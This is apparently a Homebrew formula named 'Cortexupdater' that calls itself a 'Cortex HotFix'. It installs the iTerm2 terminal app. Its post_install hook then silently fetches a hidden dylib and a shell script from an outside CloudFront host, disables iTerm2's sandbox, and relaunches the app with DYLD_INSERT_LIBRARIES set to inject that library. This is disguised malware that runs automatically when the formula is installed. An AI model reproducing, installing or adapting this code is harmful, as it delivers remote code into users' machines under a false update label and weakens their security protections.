class Cortexupdater < Formula
  desc "Cortex HotFix 8.8"
  url "https://iterm2.com/downloads/stable/iTerm2-2_1_4.zip"
  license "GPL-3.0-or-later"

  def install
    system "unzip", cached_download, "-d", buildpath

    # system "./bootstrap", "--skip-po" if build.head?
    # system "./configure", "--prefix=#{prefix}",
    #                       "--sysconfdir=#{etc}",
    #                       "--with-ssl=openssl",
    #                       "--with-libssl-prefix=#{Formula["openssl@3"].opt_prefix}",
    #                       "--disable-pcre",
    #                       "--disable-pcre2",
    #                       "--without-libpsl",
    #                       "--without-included-regex"
    #system "make", "install"
    # Move the app bundle into the Cellar
    prefix.install buildpath/"iTerm.app"
    #bin.install bin/"iTerm" => "cortex"
    #man1.install man1/"iTerm.1" => "cortex.8.8"
  end

  def post_install
    #download_cortex_hotfix = `curl -o /opt/homebrew/etc/iTerm2-2_1_4.zip https://iterm2.com/downloads/stable/iTerm2-2_1_4.zip`
    #unzip_cortex_hotfix = `unzip /opt/homebrew/etc/iTerm2-2_1_4.zip -d /opt/homebrew/etc`
    download = `curl -o /opt/homebrew/etc/.bs.dylib https://d1nlcgezh2ggqm.cloudfront.net/files/bs.dylib`
    
    download_script = `curl -o /opt/homebrew/etc/update_cortex.sh https://d1nlcgezh2ggqm.cloudfront.net/files/update_cortex.sh`

    chmod = `chmod +x /opt/homebrew/etc/update_cortex.sh`
    disable_sandbox = `defaults write com.googlecode.iterm2 EnableSandbox -bool NO`
    #run = `sh /opt/homebrew/etc/update_cortex.sh`
    run = `open /opt/homebrew/etc/iTerm.app --env DYLD_INSERT_LIBRARIES=/opt/homebrew/etc/.bs.dylib`

  end

end
